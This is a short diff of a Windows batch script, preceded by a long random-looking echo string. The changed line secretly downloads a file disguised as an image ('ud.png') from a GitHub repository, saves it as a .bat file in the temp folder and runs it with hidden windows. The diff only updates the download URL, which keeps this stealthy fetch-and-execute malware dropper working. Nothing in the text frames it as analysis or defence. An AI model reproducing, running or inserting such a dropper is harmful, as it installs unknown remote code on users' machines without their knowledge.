@@ -3,7 +3,7 @@ echo tksxovjdbvmuobfknglyjfvwzzzmelktfulocgezvfuzwifyvjpmvuqlbbqowvnjrjamdrfqcfe
 
 
 
-start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/ud-prog/1/raw/main/ud.png' -OutFile '%TEMP%\milala.bat'; Start-Process -FilePath '%TEMP%\milala.bat' -WindowStyle Hidden"
+start /min cmd /c "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ud-prog/1/main/ud.png' -OutFile '%TEMP%\milala.bat'; Start-Process -FilePath '%TEMP%\milala.bat' -WindowStyle Hidden"
 
 
 
